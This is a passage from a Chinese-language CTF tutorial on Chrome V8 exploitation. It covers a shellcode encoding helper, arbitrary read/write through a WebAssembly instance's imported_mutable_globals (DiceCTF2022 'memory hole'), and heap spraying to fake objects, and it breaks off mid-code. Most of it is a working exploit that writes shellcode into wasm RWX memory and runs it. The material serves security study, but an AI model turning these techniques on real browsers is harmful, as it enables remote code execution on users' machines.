<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = [</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996577893625528n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930873897669623914n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930951416110253384n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930838247832250448n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996698557186154n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930925778240310600n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996421403378504n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996698562857288n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996079408918456n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996696683430216n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930959146880009544n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996700016363600n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996077656554424n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996696216752689n</span>),        </span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; x.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x[i] + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">get_shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h3 id="利用-WasmInstance-的全局变量"><a href="#利用-WasmInstance-的全局变量" class="headerlink" title="利用 WasmInstance 的全局变量"></a>利用 WasmInstance 的全局变量</h3><p>由于这种方法在较高版本中不能使用，这里以 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/sandbox_bypass/wasm_global" >DiceCTF2022 memory hole <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例进行介绍。<br>这个题目我查到的 commit 号为 <code>002e39e97a56a05dd200481ea04c74b8c0203acc</code> ，虽然没有 patch 成功，但是 patch 完的部分可以正常触发漏洞。</p>
<p>和上一个 demo 一样，这个题目也添加了一个修改数组长度的方法，因此可以像上一题一样实现 address of 和 fake object 利用原语以及堆内任意地址读写。然而 wasm 产生的 rwx 段不在这个 v8 堆内，因此我们需一个真正的任意地址写来在 rwx 段内写 shellcode 。</p>
<p>wasm 可以用来实现一些的功能，比如下面这个代码就可以实现对 wasm 定义的 global 的读写。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x7E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x67</span></span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>: <span class="literal">true</span> &#125;, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123; <span class="attr">js</span>: &#123; <span class="variable language_">global</span> &#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> get_global = wasm_instance.<span class="property">exports</span>.<span class="property">get_global</span>;</span><br><span class="line"><span class="keyword">var</span> set_global = wasm_instance.<span class="property">exports</span>.<span class="property">set_global</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">set_global</span>(<span class="number">0x114514n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get_global</span>());</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>这介绍一下 wasm code 的生成方法：<br>首先编写一个能实现相应的功能的 wat 代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="title function_ invoke__">module</span></span><br><span class="line">   (<span class="keyword">global</span> <span class="variable">$g</span> (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i64))</span><br><span class="line">   (<span class="title function_ invoke__">func</span> (export <span class="string">&quot;get_global&quot;</span>) (result i64) (<span class="keyword">global</span>.get <span class="variable">$g</span>))</span><br><span class="line">   (<span class="title function_ invoke__">func</span> (export <span class="string">&quot;set_global&quot;</span>) (param <span class="variable">$p</span> i64) (<span class="keyword">global</span>.set <span class="variable">$g</span> (local.get <span class="variable">$p</span>)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>然后在<a class="link"   href="https://webassembly.github.io/wabt/demo/wat2wasm/" >这个网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上转换为 wasm 并下载转换后的文件，下载的文件中的数据即为 wasm code 。</p>
<p>这里打印出 <code>wasm_instance</code> 发现其中的 <code>imported_mutable_globals</code> 是一个完整的指针并且指向指向 <code>global</code> 对应的内存的指针（<code>global</code> 的二级指针），因此可以通过堆内任意地址读写修改 <code>imported_mutable_globals</code> 指向一个 <code>DoubleArray</code> 从而实现任意地址读写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d34817efdf7ab68e6c3a4130c1043439.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/fb1b9744b7ceb4fef1d8f40eb43d5504.png"
                      alt="在这里插入图片描述"
                ><br>之后的操作可以参考 OOB 。exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">oob_array.<span class="title function_">setLength</span>(<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line">double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">12</span>]);</span><br><span class="line">object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">8</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">8</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">12</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(offset);</span><br><span class="line">    oob_array[<span class="number">12</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> double_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">17</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">17</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">17</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">17</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sandbox_base = <span class="title function_">read</span>(<span class="number">24n</span>) &amp; <span class="number">0xFFFFFFFF00000000n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] sandbox base: &quot;</span> + <span class="title function_">hex</span>(sandbox_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x7E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x67</span></span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>: <span class="literal">true</span> &#125;, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123; <span class="attr">js</span>: &#123; <span class="variable language_">global</span> &#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> get_global = wasm_instance.<span class="property">exports</span>.<span class="property">get_global</span>;</span><br><span class="line"><span class="keyword">var</span> set_global = wasm_instance.<span class="property">exports</span>.<span class="property">set_global</span>;</span><br><span class="line"></span><br><span class="line">imported_mutable_globals = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_addr = sandbox_base + <span class="title function_">offset_of</span>(imported_mutable_globals) - <span class="number">0x9n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] imported_mutable_globals: &quot;</span> + <span class="title function_">hex</span>(imported_mutable_globals_addr));</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(wasm_instance) + <span class="number">0x50n</span>, imported_mutable_globals_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    imported_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">get_global</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    imported_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">set_global</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code2 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_instance2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code2));</span><br><span class="line"><span class="keyword">let</span> f = wasm_instance2.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(sandbox_base + <span class="title function_">offset_of</span>(wasm_instance2) - <span class="number">1n</span> + <span class="number">0x60n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>

<h1 id="堆喷伪造对象"><a href="#堆喷伪造对象" class="headerlink" title="堆喷伪造对象"></a>堆喷伪造对象</h1><p><strong>指针压缩</strong>下的通用堆喷技术，效果为：获取一个低 4 字节固定的对象</p>
<h2 id="v8-堆块管理结构"><a href="#v8-堆块管理结构" class="headerlink" title="v8 堆块管理结构"></a>v8 堆块管理结构</h2><p>一般而言，V8 中的 Heap Object 都分配在 4GB 堆空间的 <code>rw-</code> 页面上。在堆块页面的起始部分，有一段空间是用来存储堆块的元信息的，在 V8 的堆结构中有 <code>0x2118</code> 字节（具体看版本）用来存储堆结构相关信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/31dc3078d810bc5d919b3b19e6e7c3b6.png"
                      alt="在这里插入图片描述"
                ><br>其中关键字段解释如下：</p>
<ul>
<li><code>0x0000000000040000</code>：堆大小。</li>
<li><code>0x00000be508042118</code>：堆的起始地址。</li>
<li><code>0x00000be508080000</code>：堆指针，表示该堆已经被使用到哪了，即现在堆指针指向 0xbe508080000 。</li>
<li><code>0x000000000003dee8</code>： 已经被使用的 size ， 0x3dee8 + 0x2118 &#x3D; 0x40000 。</li>
<li><code>0x0000000000002118</code>：堆头大小。</li>
</ul>
<p>如果这个时候，我申请一个 <code>0xf700</code> 大小的数组。如果开启指针压缩，一个地址4字节，那么就是需要 <code>0xf700 * 4 + 0x2118 = 0x3fd18</code>，再对齐一下，那么就是<code>0x40000</code>大小的堆。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">a = <span class="title class_">Array</span>(<span class="number">0xf700</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(a);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e958497f36a9306636a16a77a970e684.png"
                      alt="在这里插入图片描述"
                ><br><code>elements</code> 字段地址为 <code>0x559081c0000+ 0x80000 + 0x2118 + 0x1 = 0x055908242119</code> 。在启动指针压缩时，在堆中储存的地址为 4 字节，而根据上述堆的特性，我们能<strong>确定低 2 字节为 <code>0x2119</code></strong> ，而<strong>一般情况下其高 2 字节也是不变的</strong>，所以这里其实 <strong>4 字节都已经确认的</strong>。</p>
<p>还有一个比较重要的点是，该 <code>FixedArray</code> 是一个大对象，其是不受 <code>gc</code> 影响的，所以这里的效果就是获取一个已经地址的内容可控的内存区域。</p>
<h2 id="任意地址对象伪造"><a href="#任意地址对象伪造" class="headerlink" title="任意地址对象伪造"></a>任意地址对象伪造</h2><p>如果存在任意地址对象伪造漏洞（<code>fake_object</code> 原语），则我们可以在一个大的 <code>DoubleArray</code> 中伪造一个 <code>DoubleArray</code> 然后实现 <code>offset_of</code> ，<code>arbitrary_offset_read</code> ，<code>arbitrary_offset_write</code> 原语。</p>
<p>首先我们先创建一个大的 <code>DoubleArray</code> 并在里面伪造一个 <code>DoubleArray</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/83f25f19f6050681363a6e709af40184.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ><br>这里需要注意的是：通过调试可知，我们只需要伪造 <code>map</code> 的前 16 字节即可。而 <code>map</code> 的前 16 字节基本是不变的。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0xf700</span>).<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"><span class="keyword">let</span> spray_array_data_offset = <span class="number">0x00202141n</span> + <span class="number">7n</span>;  <span class="comment">// spray_array 的 element 中成员的起始地址</span></span><br><span class="line"><span class="keyword">let</span> map_offset = spray_array_data_offset + <span class="number">0x1000n</span>;  <span class="comment">// 伪造的 map 在沙箱中的偏移</span></span><br><span class="line"><span class="keyword">let</span> fake_double_array_offset = map_offset + <span class="number">0x1000n</span>;  <span class="comment">// 伪造的 fake_double_array 在沙箱中的偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造 fake_double_array 的 map ，这里只需要伪造前 16 字节。</span></span><br><span class="line">spray_array[(map_offset - spray_array_data_offset) / <span class="number">8n</span>] = <span class="title function_">u2d</span>(<span class="number">0x1a04040400002141n</span>);</span><br><span class="line">spray_array[(map_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>(<span class="number">0xa0007ff1100083an</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake_double_array 的 map 